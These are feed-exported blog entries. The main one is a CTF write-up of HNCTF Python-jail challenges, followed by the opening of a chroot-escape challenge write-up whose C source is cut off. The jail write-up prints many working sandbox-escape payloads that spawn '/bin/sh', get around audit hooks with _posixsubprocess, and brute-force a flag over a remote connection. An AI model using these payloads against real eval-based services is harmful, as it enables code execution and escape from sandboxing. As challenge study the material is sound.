<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;printf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dollar_handler</span><span class="params">(FILE *stream, <span class="type">const</span> <span class="keyword">struct</span> printf_info *info, <span class="type">const</span> <span class="type">void</span> *<span class="type">const</span> *args)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">256</span>];</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> value = *(<span class="type">const</span> <span class="type">int</span> *)(args[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    len = <span class="built_in">snprintf</span>(buffer, <span class="built_in">sizeof</span>(buffer), <span class="string">&quot;$%d&quot;</span>, value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">fprintf</span>(stream, <span class="string">&quot;here is %s&quot;</span>, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">arginfo_1</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> printf_info *info, <span class="type">size_t</span> n, <span class="type">int</span> *argtypes)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        argtypes[<span class="number">0</span>] = PA_INT;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%$\n&quot;</span>, <span class="number">12345</span>, <span class="number">12346</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta"># here is $12345</span></span><br></pre></td></tr></table></figure>
<p>看起来后面几个参数理论上用不到，但是感觉很不合理，遂不想做了</p>
<p>不过这个玩意在藏东西上其实有点意思，可以来出个小题玩一下，刚好又差不多准备搞个出虚拟机的玩，那就试试</p>
<h6 id="9-29-不对想了想应该还是ida抽风估计看看汇编调用的话这些参数问题不大"><a class="markdownIt-Anchor" href="#9-29-不对想了想应该还是ida抽风估计看看汇编调用的话这些参数问题不大">#</a> 9-29: 不对，想了想应该还是 ida 抽风，估计看看汇编调用的话这些参数问题不大</h6>
<h6 id="不过出题已经放在list上了先把题出了看看再看有没有时间把这个题给做了最近确实会比较忙"><a class="markdownIt-Anchor" href="#不过出题已经放在list上了先把题出了看看再看有没有时间把这个题给做了最近确实会比较忙">#</a> 不过出题已经放在 list 上了，先把题出了看看，再看有没有时间把这个题给做了，最近确实会比较忙</h6>
]]></content>
  </entry>
  <entry>
    <title>qemu调试记录</title>
    <url>/2023/11/14/qemu%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h6 id="preface记录一下"><a class="markdownIt-Anchor" href="#preface记录一下">#</a> PREFACE：记录一下</h6>
]]></content>
  </entry>
  <entry>
    <title>pythonJail</title>
    <url>/2022/11/01/pythonJail/</url>
    <content><![CDATA[<h4 id="preface"><a class="markdownIt-Anchor" href="#preface">#</a> preface</h4>
<h6 id="thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-though-i-didnt-work-out-many-of-them-that-is-now-the-hnctf-has-ended-i-found-some-write-up-about-the-python-jail-problemspythonjail"><a class="markdownIt-Anchor" href="#thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-though-i-didnt-work-out-many-of-them-that-is-now-the-hnctf-has-ended-i-found-some-write-up-about-the-python-jail-problemspythonjail">#</a> Thanks to 空白 crazyman, who brough us so much excellent ctf exercises. (Though I didn’t work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail problems<a href="https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/">pythonJail</a>.</h6>
<span id="more"></span>
<h3 id="level-1"><a class="markdownIt-Anchor" href="#level-1">#</a> LEVEL 1</h3>
<p><img loading="lazy" data-src="pythonJail/level1.png" alt="level1"></p>
<p>From the function filter, we sees that the symbol [&quot; ’ ` i b] is banned. Which means (Show subclasses with tuple)  <code> ().\__class\__.\__base\__.\__subclasses\__()</code></p>
<p>is not allowed. What’s more, symbol ’ and &quot; is banned, so it come to us that we may can use  <code>chr</code>  to splicing a string that we wanted.</p>
<p>Two possible payload:</p>
<blockquote>
<p>getattr(getattr(getattr(getattr(()._<em>class_</em>,c),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))<br>
(().__class__.__base__.__subclasses__()[-4].__init__.__globals__<a href="'sh'">‘system’</a>)</p>
</blockquote>
<blockquote>
<p>open(chr(102)+chr(108)+chr(97)+chr(103)).read()<br>
from <a href="https://zhuanlan.zhihu.com/p/578986988">thisBlog</a></p>
</blockquote>
<p><img loading="lazy" data-src="pythonJail/level1wp.png" alt="level1pos"></p>
<h3 id="level-2"><a class="markdownIt-Anchor" href="#level-2">#</a> LEVEL 2</h3>
<p><img loading="lazy" data-src="pythonJail/level2.png" alt="level1"></p>
<p>The length of the payload is limited to 13.</p>
<p>The answer according to 空白 is the function <c style="color: #FF0000">“breakpoint()”</c>, which I didn’t figure out yet. However, there is another way. Use  <code>eval(input())</code>  so that the program receive once again for your input! Seems a little bit like  <code>/?cmd=system($_POST[1]);$1=ls</code>  to escape the filter in php right?</p>
<h3 id="level-3"><a class="markdownIt-Anchor" href="#level-3">#</a> LEVEL 3</h3>
<p><img loading="lazy" data-src="pythonJail/level3.png" alt="level3"></p>
<p>This time, the maximum length of our payload is down to 7.</p>
<p>I didn’t quite understand yet, but function  <code>help()</code>  can help you passby the 7 words limit. Here is when I tried others’ payload, quite amazing and when I am available I shall come back to study it.</p>
<blockquote></blockquote>
<p><img loading="lazy" data-src="pythonJail/level3wp.png" alt="level3"></p>
<h3 id="python2-input-jail"><a class="markdownIt-Anchor" href="#python2-input-jail">#</a> PYTHON2 INPUT JAIL</h3>
<p><img loading="lazy" data-src="pythonJail/input(jail).png" alt="input(jail)"></p>
<p>python2, another thing I am not familiar with…</p>
<p>Looking up others’ write up…</p>
<p><img loading="lazy" data-src="pythonJail/input(jail)wp.png" alt="input(jail)"></p>
<h3 id="level-25"><a class="markdownIt-Anchor" href="#level-25">#</a> LEVEL 2.5</h3>
<p><img loading="lazy" data-src="pythonJail/level2.5.png" alt="level2.5"></p>
<p>We can use  <code>breakpoint()</code>  to go into pdb, and rce is possible.</p>
<h3 id="lake"><a class="markdownIt-Anchor" href="#lake">#</a> LAKE</h3>
<p><img loading="lazy" data-src="pythonJail/lake.png" alt="lake"></p>
<h6 id="strange-christencrazyman-seems-to-name-it-lake-from-leak"><a class="markdownIt-Anchor" href="#strange-christencrazyman-seems-to-name-it-lake-from-leak">#</a> Strange christen.(Crazyman seems to name it ‘lake’ from ‘leak’?)</h6>
<p>Use  <code>globals()</code>  to leak the key. And then get shell.</p>
<h3 id="lke"><a class="markdownIt-Anchor" href="#lke">#</a> L@KE</h3>
<p><img loading="lazy" data-src="pythonJail/l%40ke.png" alt="l@ke"></p>
<h6 id="another-strange-christen"><a class="markdownIt-Anchor" href="#another-strange-christen">#</a> Another strange christen…</h6>
<p>The maxinum length of payload is now 6, so only  <code>help()</code>  is possible.</p>
<p>But unlike cases above, this time module ‘os’ is destory or whatever. Now we comes to the base reason why we use ‘os’ above.  <code>help()</code>  can actually get you into any module in the python file, which includes  <code>__main__</code> ! And surely, the key can be found inside.</p>
<br>
##### OK, now we've go through the first four level( designed by crazyman, that is). From level 5, there provides no source code.
<br>
<h3 id="level-5"><a class="markdownIt-Anchor" href="#level-5">#</a> LEVEL 5</h3>
<p><img loading="lazy" data-src="pythonJail/level5.png" alt="level5"></p>
<p>Just rce can give you the flag.(unexpected) Later we will see how it shall really be work out.</p>
<h3 id="level-4"><a class="markdownIt-Anchor" href="#level-4">#</a> LEVEL 4</h3>
<h6 id="why-is-it-4-after-5-i-dont-know"><a class="markdownIt-Anchor" href="#why-is-it-4-after-5-i-dont-know">#</a> (Why is it 4 after 5 I don’t know…)</h6>
<p>4 bytes rce, seems impossible, so lets just guass it use  <code>os.system(input_data)</code>  to get your input and bingo.</p>
<p><img loading="lazy" data-src="pythonJail/level4.png" alt="level4"></p>
<h3 id="lake-2"><a class="markdownIt-Anchor" href="#lake-2">#</a> LAkE</h3>
<p><img loading="lazy" data-src="pythonJail/laKelaKe.png" alt="laKe"></p>
<p>This time it imports  <code>sys</code>  module with <a href="https://peps.python.org/pep-0578/">audit hook</a>, and direct RCE function like  <code>pty.spawn、os.system、os.exec、os.posix_spawn、os.spawn、subprocess.Popen</code>  is not available. Whats more,  <code>compile、eval、exec、open</code>  is unfetchable. However, there use  <code>random.setstate()</code>  to generate its random number, which is base on Mersenne <a href="https://zh.wikipedia.org/zh-tw/%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E7%AE%97%E6%B3%95">Twister</a>, and is crackable. In general, if we got the state of the random number generator, we can generate the same number. That leads two problems: There is only one ‘eval’ in the server code, but we need to execute more. How to restore the state BEFORE the random number is generated?</p>
<p>First, we need to know a thing named Assignment Expresions in python, or rather, walrus operator. Then, we package those formula in a list. They will be calculate from left to right. As for function, we can replace it with  <code>lambda</code> . Some case can be view below:</p>
<pre><code>https://ctftime.org/writeup/21982

https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#operators-and-short-tricks
</code></pre>
<p>Second, if we  <code>import random</code>  and print  <code>random.getstate</code>  at the beginning, we got a tuple back. which may look like: <code>(3, (..., 624), None)</code> . The first value ‘3’ and the last value ‘None’ is fixed. Only 624 numbers in the middle is changed. So if we assign the conter zero, we get the random number.</p>
<h5 id="payload"><a class="markdownIt-Anchor" href="#payload">#</a> payload:</h5>
<pre><code>[random:=\_\_import__('random'), state:=random.getstate(), pre_state:=list(state[1])[:624], random.setstate((3,tuple(pre_state+[0]),None)), random.randint(1, 9999999999999)][-1]
</code></pre>
<h3 id="level-51"><a class="markdownIt-Anchor" href="#level-51">#</a> LEVEL 5.1</h3>
<p>Dued to the unexpected solves in level5, crazyman gives another problem, stating level5.1.</p>
<p><code>nc</code>  and  <code>dir()</code> (as it tells you to), found  <code>my_flag</code> , try  <code>list(getattr(my_flag,'flag))</code> , got a  <code>AttributeError: 'flag_level5' object has no attribute 'flag'</code> . So payload is  <code>list(getattr(my_flag,'flag_level5'))</code></p>
<p>Another way to solve this problem(though quite similar, the latter gets its shell)</p>
<p><img loading="lazy" data-src="pythonJail/level5.1_1.png" alt="level5.1_1"><br>
<img loading="lazy" data-src="pythonJail/level5.1_2.png" alt="level5.1_2"></p>
<h3 id="lak3"><a class="markdownIt-Anchor" href="#lak3">#</a> LAK3</h3>
<p><img loading="lazy" data-src="pythonJail/lak3.png" alt="lak3"></p>
<p>Same as before, we can use the excate same payload. Though the official payload provides by crazyman is  <code>__import__('sys')._getframe(1).f_locals['right_guesser_question_answer']</code></p>
<h5 id="a-good-blog-can-refer"><a class="markdownIt-Anchor" href="#a-good-blog-can-refer">#</a> <a href="https://ctftime.org/writeup/21982">a good blog can refer</a></h5>
<h3 id="type-chnnel"><a class="markdownIt-Anchor" href="#type-chnnel">#</a> tyPe Ch@nnEl</h3>
<p><img loading="lazy" data-src="pythonJail/sideChannel.png" alt="sideChannel"></p>
<p>I haven’t quite understand yet. So I will put the payload beforehand:</p>
<p>One possible:</p>
<pre><code>from pwn import *
from tqdm import trange

class Gao:
    def __init__(self):
        self.known = ''

def init(self):
    # self.conn = process(['python3', './server_type.py'])
    self.conn = remote('1.14.71.254', 28563)

def gao(self):
    payload = '((1)if(type(flag.split())(flag.encode()).pop(&#123;pos&#125;)^&#123;val&#125;)else(True))'
    i = len(self.known)
    while True:
        for j in trange(32, 128):
            cur_payload = payload.format(pos=i, val=j)
            self.init()
            self.conn.sendlineafter('Payload:', cur_payload)
            s = self.conn.recvline()
            self.conn.close()
            if (b'Try' in s):
                return
            elif (b'bool' in s):
                self.known += chr(j)
                print(self.known)
                print(self.known)
                print(self.known)
                break
        else:
            raise Exception('GG simida')            
        i += 1
if __name__ == '__main__':
    g = Gao()
    g.gao()
</code></pre>
<p>↑ Can took some time(when I tried)</p>
<p>Officail:</p>
<pre><code>for i in range(len(flag), len(flag)+100): # flag length
for guess in chars: # all possible chars
    print(&quot;guess: &quot;, bytes(flag), chr(guess))
    payload = f&quot;type(type(flag).mro())(type(type(flag).mro())(flag).pop(&#123;i&#125;).encode()).remove(&#123;guess&#125;)&quot;
</code></pre>
<h3 id="level-4-2"><a class="markdownIt-Anchor" href="#level-4-2">#</a> LEVEL 4</h3>
<h6 id="level-4-again"><a class="markdownIt-Anchor" href="#level-4-again">#</a> level 4 again</h6>
<p><img loading="lazy" data-src="pythonJail/level4_1.png" alt="level4_1"></p>
<p>Quite similar as before, just use  <code>bytes().decode()</code>  to pass the black list.</p>
<p><img loading="lazy" data-src="pythonJail/level4wp1.png" alt="level4_1wp1"><br>
<img loading="lazy" data-src="pythonJail/level4wp2.png" alt="level4_1wp2"></p>
<p>payload:</p>
<pre><code>().__class__.__base__.__subclasses__()
</code></pre>
<h5 id><a class="markdownIt-Anchor" href="#">#</a> </h5>
<p>​    ().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[-4].<strong>init</strong>.<strong>globals</strong>[bytes([115, 121, 115, 116, 101, 109]).decode()](bytes([115, 104]).decode())</p>
<p>There is another solution to this problem: I am not sure I fully understand it, so I put a <a href="https://zhuanlan.zhihu.com/p/579057932">link</a> here beforehand.</p>
<h5 id="payload-2"><a class="markdownIt-Anchor" href="#payload-2">#</a> payload:</h5>
<pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])
</code></pre>
<p><img loading="lazy" data-src="pythonJail/level4wp_3.png" alt="level4wp3"></p>
<h3 id="level-405"><a class="markdownIt-Anchor" href="#level-405">#</a> LEVEL 4.0.5</h3>
<p>Same payload as last one.</p>
<p><img loading="lazy" data-src="pythonJail/level4.0.5.png" alt="level4.0.5"></p>
<h3 id="level-41"><a class="markdownIt-Anchor" href="#level-41">#</a> LEVEL 4.1</h3>
<p>Quite same as before.</p>
<p><img loading="lazy" data-src="pythonJail/level4.1wp1.png" alt="level4.1"></p>
<p>Ps, the  <code>bytes</code>  is now banned, but still you can use  <code>show subclassed with tuples</code>  to replace, like this:</p>
<pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())
</code></pre>
<h3 id="level-42"><a class="markdownIt-Anchor" href="#level-42">#</a> LEVEL 4.2</h3>
<p>Quite same as before…</p>
<p><img loading="lazy" data-src="pythonJail/level4.2wp.png" alt="level4.2"></p>
<h5 id="or-rather-use-join"><a class="markdownIt-Anchor" href="#or-rather-use-join">#</a> Or rather use  <code>join</code> :</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">86</span>],().__doc__[<span class="number">19</span>],().__doc__[<span class="number">4</span>],().__doc__[<span class="number">17</span>],().__doc__[<span class="number">10</span>]])](<span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">56</span>]]))</span><br></pre></td></tr></table></figure>
<h3 id="level-43"><a class="markdownIt-Anchor" href="#level-43">#</a> LEVEL 4.3</h3>
<p>Quite same as before…</p>
<p><img loading="lazy" data-src="pythonJail/level4.3wp.png" alt="level4.3"></p>
<br>
##### The next few levels are become harder and harder.
<br>
<h3 id="level-6"><a class="markdownIt-Anchor" href="#level-6">#</a> LEVEL 6</h3>
<h4 id="repetition"><a class="markdownIt-Anchor" href="#repetition">#</a> repetition:</h4>
<p><img loading="lazy" data-src="pythonJail/level6wp1.png" alt="level6wp1"><br>
<img loading="lazy" data-src="pythonJail/level6wp2.png" alt="level6wp2"><br>
<img loading="lazy" data-src="pythonJail/level6wp3.png" alt="level6wp3"></p>
<h5 id="link-that-may-help-you"><a class="markdownIt-Anchor" href="#link-that-may-help-you">#</a> <a href="https://ctftime.org/writeup/31883">link that may help you</a></h5>
<p>The basic idea is to RCE with  <code>_posixsubprocess.fork_exec</code> . If we import it directly, it will trigger the audit hook. But we can pass it by using  <code>__builtins__['__loader__'].load_module('_posixsubprocess')</code>  or  <code>__loader__.load_module('_posixsubprocess')</code> . Also, due to its repeatedly exct, we just shell like this:</p>
<pre><code>import os
__loader__.load_module('_posixsubprocess').fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)
</code></pre>
<h3 id="level-61"><a class="markdownIt-Anchor" href="#level-61">#</a> LEVEL 6.1</h3>
<p>This time, we only got one time to excute our payload. Though, we our learning above, we know that walrus operator can help us. Also, the shell will shut immediately, the blogger think of a interesting way to overcome this, by brute force, getting shell over and over again and try to input command. That works.</p>
<p><img loading="lazy" data-src="pythonJail/level6.1wp.png" alt="level6.1wp"></p>
<h5 id="payload-3"><a class="markdownIt-Anchor" href="#payload-3">#</a> payload:</h5>
<pre><code>[os := __import__('os'), _posixsubprocess := __loader__.load_module('_posixsubprocess'), [_posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in range(100000)]]
</code></pre>
<h5 id="or"><a class="markdownIt-Anchor" href="#or">#</a> or</h5>
<pre><code>[os := __import__('os'), itertools := __loader__.load_module('itertools'), _posixsubprocess := __loader__.load_module('_posixsubprocess'), [_posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in itertools.count(0)]]
</code></pre>
<h3 id="safeeval"><a class="markdownIt-Anchor" href="#safeeval">#</a> SAFEEVAL</h3>
<p>Use lambda to wrap up RCE</p>
<p>payload:</p>
<pre><code>(lambda: __import__('os').system('sh'))()
</code></pre>
<p><img loading="lazy" data-src="pythonJail/safeeval_1.png" alt="safeeval"><br>
<img loading="lazy" data-src="pythonJail/safeeval_2.png" alt="safeeval"></p>
<h3 id="level7"><a class="markdownIt-Anchor" href="#level7">#</a> LEVEL7</h3>
<h6 id="come-back-later-to-try-to-figure-it-out"><a class="markdownIt-Anchor" href="#come-back-later-to-try-to-figure-it-out">#</a> Come back later to try to figure it out…</h6>
<p>payload:</p>
<blockquote>
<p>@exec<br>
@input<br>
class X: pass</p>
</blockquote>
<blockquote>
<p><strong>import</strong>(‘os’).system(‘sh’)</p>
</blockquote>
<h5 id="blog"><a class="markdownIt-Anchor" href="#blog">#</a> <a href="https://gynvael.coldwind.pl/n/python_sandbox_escape">blog</a></h5>
<pre><code>↑# [organizers] Robin_Jadoul solution↑
</code></pre>
<p><img loading="lazy" data-src="pythonJail/level7wp1.png" alt="level7"><br>
<img loading="lazy" data-src="pythonJail/level7wp2.png" alt="level7"></p>
<h3 id="ok-so-thats-the-end-of-the-hnctf-there-are-some-thing-that-may-help-you-get-further-about-pyjail"><a class="markdownIt-Anchor" href="#ok-so-thats-the-end-of-the-hnctf-there-are-some-thing-that-may-help-you-get-further-about-pyjail">#</a> Ok, so that’s the end of the hnctf. There are some thing that may help you get further about pyjail:</h3>
<pre><code>https://gynvael.coldwind.pl/n/python_sandbox_escape

https://www.youtube.com/watch?v=Ub_BMOMDOx0

https://zhuanlan.zhihu.com/p/578966149
</code></pre>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>jail</tag>
      </tags>
  </entry>
  <entry>
    <title>sandbox</title>
    <url>/2024/04/04/sandbox/</url>
    <content><![CDATA[<h6 id="preface"><a class="markdownIt-Anchor" href="#preface">#</a> PREFACE:</h6>
<span id="more"></span>
<p>审洞，chroot 以后没有 chdir，会保留当前文件夹下的状态信息，可以直接到需要的目录下运行读取，sendfile 可以跨 chroot 把东西读出来</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sendfile.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>(argc &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;###\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;### Welcome to %s!\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;###\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;jail, not the real flag file outside of it. If you want the real flag, you must escape.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The only thing you can do in this challenge is read out one single file, as specified by the first argument to the&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;program (argv[1]).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">assert</span>(argc &gt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> jail_path[] = <span class="string">&quot;/tmp/jail-XXXXXX&quot;</span>;</span><br><span class="line">    <span class="built_in">assert</span>(<span class="built_in">mkdtemp</span>(jail_path) != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Creating a jail at `%s`.\n&quot;</span>, jail_path);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">assert</span>(<span class="built_in">chroot</span>(jail_path) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fffd = <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, O_WRONLY | O_CREAT);</span><br><span class="line">    <span class="built_in">write</span>(fffd, <span class="string">&quot;FLAG&#123;FAKE&#125;&quot;</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">close</span>(fffd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sending the file at `%s` to stdout.\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">sendfile</span>(<span class="number">1</span>, <span class="built_in">open</span>(argv[<span class="number">1</span>], <span class="number">0</span>), <span class="number">0</span>, <span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>level2</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sendfile.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;capstone/capstone.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CAPSTONE_ARCH CS_ARCH_X86</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CAPSTONE_MODE CS_MODE_64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_disassembly</span><span class="params">(<span class="type">void</span> *shellcode_addr, <span class="type">size_t</span> shellcode_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    csh handle;</span><br><span class="line">    cs_insn *insn;</span><br><span class="line">    <span class="type">size_t</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">cs_open</span>(CAPSTONE_ARCH, CAPSTONE_MODE, &amp;handle) != CS_ERR_OK)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR: disassembler failed to initialize.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    count = <span class="built_in">cs_disasm</span>(handle, shellcode_addr, shellcode_size, (<span class="type">uint64_t</span>)shellcode_addr, <span class="number">0</span>, &amp;insn);</span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">size_t</span> j;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;      Address      |                      Bytes                    |          Instructions\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;------------------------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; count; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;0x%016lx | 